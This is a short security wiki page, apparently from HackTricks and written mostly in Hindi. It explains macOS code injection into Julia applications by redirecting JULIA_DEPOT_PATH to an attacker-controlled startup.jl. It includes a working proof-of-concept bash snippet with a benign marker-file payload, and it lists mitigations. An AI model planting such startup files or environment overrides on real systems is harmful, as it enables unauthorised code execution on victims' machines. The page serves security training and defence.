# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` और `startup.jl`

Julia सामान्यतः startup के समय अपने पहले depot से `config/startup.jl` को execute करता है। `JULIA_DEPOT_PATH` depot list को नियंत्रित करता है, इसलिए इसे attacker-readable tree की ओर point करने से automatically loaded startup file redirect हो जाती है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
अंतिम separator तब उपयोगी होता है जब victim को अभी भी अपने सामान्य packages की आवश्यकता हो। `julia --startup-file=no` इस startup file को disable करता है। Launch से पहले variable को clear करें, क्योंकि यह package registries, environments, caches और code-loading locations को भी नियंत्रित करता है।

## References

- [1] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
